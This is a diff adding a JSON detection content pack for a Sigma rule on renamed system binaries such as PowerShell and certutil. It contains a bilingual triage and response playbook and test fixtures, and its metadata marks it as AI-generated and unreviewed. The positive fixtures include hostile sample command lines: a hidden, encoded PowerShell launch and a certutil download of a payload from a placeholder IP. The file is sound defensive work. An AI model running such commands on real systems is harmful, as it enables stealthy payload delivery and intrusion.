@@ -1,0 +1,142 @@
+{
+  "rule": {
+    "id": "0ba1da6d-b6ce-4366-828c-18826c9de23e",
+    "title": "Potential Defense Evasion Via Rename Of Highly Relevant Binaries",
+    "level": "high",
+    "status": "test",
+    "author": "Matthew Green - @mgreen27, Florian Roth (Nextron Systems), frack113",
+    "path": "windows/process_creation/proc_creation_win_renamed_binary_highly_relevant.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_renamed_binary_highly_relevant.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1036.003"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó un binario cuyos metadatos PE (OriginalFileName, Description o Product) corresponden a una herramienta sensible como PowerShell, PsExec, certutil o rundll32, pero con un nombre de archivo distinto al original.",
+      "what_it_detects": "Eventos de creación de procesos (Sysmon EID 1 o equivalente) donde OriginalFileName, Description o Product identifican un LOLBin o PsExec, mientras que Image no termina en ninguno de los nombres esperados (por ejemplo \\powershell.exe o \\certutil.exe).",
+      "why_it_matters": "Renombrar utilidades del sistema (ATT&CK T1036.003, Masquerading: Rename System Utilities) permite evadir detecciones basadas en el nombre del proceso y ejecutar descargas, scripts o movimiento lateral con herramientas confiables. Es una técnica común en loaders y ransomware.",
+      "triage_steps": [
+        "Compare Image con OriginalFileName y Description para identificar qué herramienta real se ejecutó y desde qué ruta (Temp, ProgramData, Users\\Public son sospechosas).",
+        "Revise CommandLine en busca de descargas, contenido codificado (-enc), URLs, scriptlets, ejecución remota o modificaciones del registro.",
+        "Analice ParentImage y ParentCommandLine: un padre de Office, navegador, wscript o servicio inesperado aumenta la sospecha.",
+        "Obtenga el hash del binario y verifique firma y reputación; confirme si es una copia idéntica del original de Windows o Sysinternals.",
+        "Determine cuándo y quién creó el archivo renombrado (Sysmon EID 11, eventos de archivo del EDR) y el usuario que ejecutó el proceso.",
+        "Pivote en el mismo host +/- 15 minutos: procesos hijos, conexiones de red, persistencia (tareas, servicios, claves Run) y otras alertas.",
+        "Busque el mismo hash o nombre de Image en otros endpoints para medir el alcance; para PsExec, revise conexiones SMB y servicios PSEXESVC remotos."
+      ],
+      "false_positives": [
+        "Aplicaciones internas o instaladores que empaquetan copias renombradas de PowerShell, msiexec o reg.exe; suelen ser consistentes y fáciles de excluir por ruta y hash.",
+        "Herramientas de administración o RMM que distribuyen PsExec con otro nombre para soporte remoto autorizado.",
+        "Copias de pruebas o laboratorios de seguridad que renombran binarios deliberadamente."
+      ],
+      "response_steps": [
+        "Valide con el dueño del sistema o de la aplicación si el binario renombrado es legítimo; si lo es, documente y cree una exclusión acotada por ruta y hash.",
+        "Si no hay justificación, aísle el endpoint desde el EDR y preserve el binario, la memoria del proceso y los logs relevantes.",
+        "Termine el proceso y elimine el binario renombrado y la persistencia asociada solo después de recolectar evidencia.",
+        "Restablezca credenciales del usuario implicado si hubo PsExec, descarga de payloads o indicios de robo de credenciales.",
+        "Busque IOCs (hash, rutas, dominios) en toda la flota y restaure el equipo desde una línea base limpia si hubo compromiso."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque renombrar herramientas de ejecución y movimiento lateral rara vez es legítimo y suele indicar evasión deliberada."
+    },
+    "en": {
+      "summary": "A binary whose PE metadata (OriginalFileName, Description or Product) identifies a sensitive tool such as PowerShell, PsExec, certutil or rundll32 ran under a file name different from the original.",
+      "what_it_detects": "Process creation events (Sysmon EID 1 or equivalent) where OriginalFileName, Description or Product match a LOLBin or PsExec, but Image does not end with any expected name such as \\powershell.exe or \\certutil.exe.",
+      "why_it_matters": "Renaming system utilities (ATT&CK T1036.003, Masquerading: Rename System Utilities) bypasses name-based detections while abusing trusted tools for downloads, scripting or lateral movement. Loaders and ransomware commonly use it.",
+      "triage_steps": [
+        "Compare Image with OriginalFileName and Description to identify the real tool and its path; Temp, ProgramData and Users\\Public are suspicious locations.",
+        "Review CommandLine for downloads, encoded content (-enc), URLs, scriptlets, remote execution or registry changes.",
+        "Check ParentImage and ParentCommandLine; an Office app, browser, wscript or unexpected service parent raises suspicion.",
+        "Get the binary hash, check signature and reputation, and confirm whether it is an exact copy of the Windows or Sysinternals original.",
+        "Find when and by whom the renamed file was created (Sysmon EID 11, EDR file events) and which user ran the process.",
+        "Pivot on the same host +/- 15 minutes: child processes, network connections, persistence (tasks, services, Run keys) and other alerts.",
+        "Hunt for the same hash or Image name on other endpoints; for PsExec, review SMB connections and remote PSEXESVC services."
+      ],
+      "false_positives": [
+        "In-house applications or installers bundling renamed copies of PowerShell, msiexec or reg.exe; usually consistent and easy to exclude by path and hash.",
+        "Admin or RMM tooling that ships PsExec under a different name for authorized remote support.",
+        "Security testing or lab environments that rename binaries on purpose."
+      ],
+      "response_steps": [
+        "Confirm with the system or application owner whether the renamed binary is legitimate; if so, document it and add a narrow path-and-hash exclusion.",
+        "If unjustified, isolate the endpoint via EDR and preserve the binary, process memory and relevant logs.",
+        "Kill the process and remove the renamed binary and related persistence only after evidence is collected.",
+        "Reset the involved user's credentials if PsExec, payload downloads or credential theft indicators are present.",
+        "Sweep the fleet for IOCs (hash, paths, domains) and rebuild from a clean baseline if compromise is confirmed."
+      ],
+      "severity_rationale": "High fits because renaming execution and lateral-movement tools is rarely legitimate and usually signals deliberate evasion."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PowerShell copied to C:\\Users\\Public as svchost32.exe and run with an encoded command from wscript.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Users\\Public\\svchost32.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "Description": "Windows PowerShell",
+          "Product": "Microsoft® Windows® Operating System",
+          "CommandLine": "C:\\Users\\Public\\svchost32.exe -nop -w hidden -enc SQBFAFgA",
+          "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+          "ParentCommandLine": "wscript.exe C:\\Users\\jperez\\Downloads\\invoice.js"
+        }
+      },
+      {
+        "description": "Certutil renamed to update.exe in ProgramData used to download a file.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\ProgramData\\update.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "Description": "CertUtil.exe",
+          "Product": "Microsoft® Windows® Operating System",
+          "CommandLine": "C:\\ProgramData\\update.exe -urlcache -split -f http://198.51.100.23/a.bin C:\\ProgramData\\a.bin",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c C:\\ProgramData\\run.bat"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate certutil.exe from System32 with its original name; excluded by the Image filter.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "OriginalFileName": "CertUtil.exe",
+          "Description": "CertUtil.exe",
+          "Product": "Microsoft® Windows® Operating System",
+          "CommandLine": "certutil.exe -verify C:\\certs\\server.cer",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "Ordinary renamed-looking application whose metadata does not match any monitored binary.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files\\Example\\agent-updater.exe",
+          "OriginalFileName": "updater.exe",
+          "Description": "Example Agent Updater",
+          "Product": "Example Agent",
+          "CommandLine": "\"C:\\Program Files\\Example\\agent-updater.exe\" --check",
+          "ParentImage": "C:\\Windows\\System32\\services.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
